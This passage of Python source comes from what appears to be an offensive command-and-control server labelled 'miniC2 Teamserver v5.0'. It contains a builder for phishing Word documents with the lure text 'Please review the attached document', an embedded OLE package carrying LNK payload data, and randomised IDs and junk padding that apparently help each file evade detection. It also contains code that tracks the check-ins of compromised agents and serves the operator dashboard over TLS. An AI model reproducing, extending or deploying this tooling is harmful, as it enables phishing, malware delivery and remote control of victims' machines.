    <w:p><w:r><w:rPr><w:b/><w:sz w:val="28"/></w:rPr><w:t>Please review the attached document</w:t></w:r></w:p>
    <w:p>
      <w:r>
        <w:object w:dxaOrig="5000" w:dyaOrig="5000">
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="457200" cy="457200"/>
            <wp:docPr id="{random.randint(1,99)}" name="Linked Object"/>
            <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/oleObject">
                <p:pic>
                  <p:nvPicPr><p:cNvPr id="{random.randint(2,99)}" name="Picture {random.randint(1,20)}"/><p:cNvPicPr/></p:nvPicPr>
                  <p:blipFill><a:blip r:embed="rId1"/></p:blipFill>
                </p:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
          <o:OLEObject Type="Embed" ProgID="Package" ShapeID="_x0000_i{random.randint(1025,9999)}" DrawAspect="Content" ObjectID="_{random.randint(1,99)}" r:id="rId1"/>
        </w:object>
      </w:r>
    </w:p>
    {junk}
    <w:sectPr>
      <w:pgSz w:w="12240" w:h="15840"/>
      <w:pgMar w:top="{1440+random.randint(0,200)}" w:right="1800" w:bottom="1440" w:left="1800"/>
    </w:sectPr>
  </w:body>
</w:document>'''
    with zipfile.ZipFile(fpath, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", content_types)
        zf.writestr("_rels/.rels", rels)
        zf.writestr("word/_rels/document.xml.rels", doc_rels)
        zf.writestr("word/document.xml", document_xml)
        zf.writestr(ole_path, lnk_data)
    return fname, os.path.getsize(fpath)





def check_timeouts():
    WARN_THRESHOLD = 30
    OFFLINE_THRESHOLD = 120
    DEAD_THRESHOLD = 600
    while True:
        time.sleep(10)
        now = datetime.now()
        for aid in list(agents.keys()):
            try:
                a = agents[aid]
                last = datetime.fromisoformat(a["last_seen"])
                elapsed = (now - last).total_seconds()
                sleep_sec = a.get("sleep", 10)
                cycle = max(sleep_sec * 2, 20)
                if elapsed < cycle:
                    a["status"] = "online"
                    a["online"] = True
                    a["missed_checkins"] = 0
                elif elapsed < WARN_THRESHOLD:
                    a["missed_checkins"] = int(elapsed / max(sleep_sec, 1))
                    if a["missed_checkins"] >= 2:
                        a["status"] = "warning"
                        a["online"] = True
                    else:
                        a["status"] = "online"
                        a["online"] = True
                elif elapsed < OFFLINE_THRESHOLD:
                    a["status"] = "offline"
                    a["online"] = False
                elif elapsed < DEAD_THRESHOLD:
                    a["status"] = "dead"
                    a["online"] = False
                else:
                    a["status"] = "dead"
                    a["online"] = False
            except: pass


if __name__ == "__main__":
    os.makedirs(AGENT_BUILD_DIR, exist_ok=True)
    print("=" * 50)
    print("  miniC2 Teamserver v5.0 (Standalone)")
    print(f"  https://0.0.0.0:{PORT}")
    print(f"  Dashboard: https://127.0.0.1:{PORT}")
    print("=" * 50)
    threading.Thread(target=check_timeouts, daemon=True).start()
    C2Handler.DASHBOARD_HTML = DASHBOARD_HTML
    server = HTTPServer((HOST, PORT), C2Handler)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(CERT_FILE, KEY_FILE)
    server.socket = ctx.wrap_socket(server.socket, server_side=True)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        server.shutdown()
